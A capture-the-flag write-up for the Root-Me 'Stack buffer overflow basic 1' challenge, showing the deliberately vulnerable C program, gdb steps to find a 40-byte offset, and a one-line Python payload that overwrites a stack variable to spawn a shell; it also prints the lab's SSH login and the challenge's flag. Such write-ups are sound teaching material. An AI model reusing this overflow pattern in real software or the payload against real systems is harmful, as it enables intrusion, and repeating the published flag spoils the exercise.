# ELF x86 - Stack buffer overflow basic 1
- Point: 5pts
- Author: [Lyes](https://www.root-me.org/Lyes?lang=en),  25 March 2015
- Level: Very Easy
- SSH Access:&emsp;ssh -p 2222 app-systeme-ch13@challenge02.root-me.org 
- Password:&emsp;app-systeme-ch13

![image](https://user-images.githubusercontent.com/48288606/141502028-c005e26c-0784-400c-a79d-14c12a79e000.png)

## Write-up:
Look at the code:
```C
#include <unistd.h>
#include <sys/types.h>
#include <stdlib.h>
#include <stdio.h>
 
int main()
{
 
  int var;
  int check = 0x04030201;
  char buf[40];
 
  fgets(buf,45,stdin);
 
  printf("\n[buf]: %s\n", buf);
  printf("[check] %p\n", check);
 
  if ((check != 0x04030201) && (check != 0xdeadbeef))
    printf ("\nYou are on the right way!\n");
 
  if (check == 0xdeadbeef)
   {
     printf("Yeah dude! You win!\nOpening your shell...\n");
     setreuid(geteuid(), geteuid());
     system("/bin/bash");
     printf("Shell closed! Bye.\n");
   }
   return 0;
}
```
- If we can change the change check's value from **"0x04030201"** to **"0xdeadbeef"**, we can pass the challenge by opening the shell. <br>
- Var **check** is declared first, after **buf**; so **check** is nearer to the top of the stack than **buf**, which makes it able to override the value of **check**.<br>
- Disassembling the main function and we set break point at the **fgets function line**. Then run the program

```
gdb-peda$ b*main+55
Breakpoint 1 at 0x804857d
```

- Try inputing `aaaaaaaa` and watch that value's address.

![image](https://user-images.githubusercontent.com/48288606/146744069-794864a9-8906-4e64-a346-9bb1abda2bcb.png)

- Here, we examine the address of **aaaa** and in range 20 adjacent addressand  we see that our **check** 's value is at **0xbffffb0c**. And our input **aaaa** is at **0xbffffae4**. So we need the calculate the distance for writing the desired value to the proper position. 
```
gdb-peda$ p/d 0xbffffb0c-0xbffffae4
$1 = 40
```

### Solution:

Fill the first 40 bytes of **buf** with arbitrary character, then with the satisfied value **"0xdeadbeef"**. <br>
Command: `python -c "print('a'*40 +'\xef\xbe\xad\xde')"| ./ch13` <br>
But as we see, it just open the shell and close it because there is no input. [Read here ?](https://www.root-me.org/?page=forum&id_thread=10116)<br>
As suggested, the final payload: `(python -c "print('a'*40 +'\xef\xbe\xad\xde')";cat) | ./ch13 `<br>
Then read the `.passwd` file.

Pass: 1w4ntm0r3pr0np1s

